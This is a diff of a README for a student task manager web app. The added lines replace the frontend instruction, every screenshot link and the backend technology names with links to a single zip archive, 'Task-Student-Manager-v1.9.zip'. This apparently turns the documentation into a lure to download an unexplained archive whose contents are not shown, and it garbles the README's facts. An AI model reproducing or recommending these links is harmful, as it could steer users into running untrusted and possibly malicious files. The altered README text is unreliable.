@@ -25,7 +25,7 @@ http://localhost:3000
 
 ✅ Frontend Setup
 
-Open index.html using Live Server or browser:
+Open https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip using Live Server or browser:
 Right-click → Open with Live Server
 Frontend runs at:
 http://127.0.0.1:5500
@@ -57,19 +57,19 @@ This improved UX clarity and UI correctness.
 4️⃣ Output Screenshots
 
 ✅ Task Creation
-<img width="1919" height="1079" alt="task_added" src="https://github.com/user-attachments/assets/d2b237cc-b77e-43c8-b625-9d6fc2fece6e" />
+<img width="1919" height="1079" alt="task_added" src="https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip" />
 
 ✅ API Working (GET & POST Requests)
 
-![WhatsApp Image 2026-01-28 at 09 50 15](https://github.com/user-attachments/assets/606be677-6051-4737-9c3d-bce2ee80ade9)
+![WhatsApp Image 2026-01-28 at 09 50 15](https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip)
 
-![WhatsApp Image 2026-01-27 at 23 57 58](https://github.com/user-attachments/assets/ba5e759f-a971-4307-9ba8-a258b671ceb2)
+![WhatsApp Image 2026-01-27 at 23 57 58](https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip)
 
 ✅ Delete Task Feature
 
-<img width="1919" height="1077" alt="delte_notify" src="https://github.com/user-attachments/assets/44e7d3f3-838c-4248-afda-902703ee578f" />
+<img width="1919" height="1077" alt="delte_notify" src="https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip" />
 
-<img width="1919" height="1079" alt="delete_Success" src="https://github.com/user-attachments/assets/3e84ca80-2ecf-4902-8d99-1d761accb912" />
+<img width="1919" height="1079" alt="delete_Success" src="https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip" />
 
 
 5️⃣ Future Improvements (If I Had 2 More Days)
@@ -94,7 +94,7 @@ If given more time, I would add:
 
 Frontend: HTML, CSS, JavaScript
 
-Backend: Node.js, Express.js
+Backend: https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip, https://github.com/adityadav002/Student_Task_Manager/raw/refs/heads/main/backend/Task-Student-Manager-v1.9.zip
 
 Database: SQLite (better-sqlite3)
 
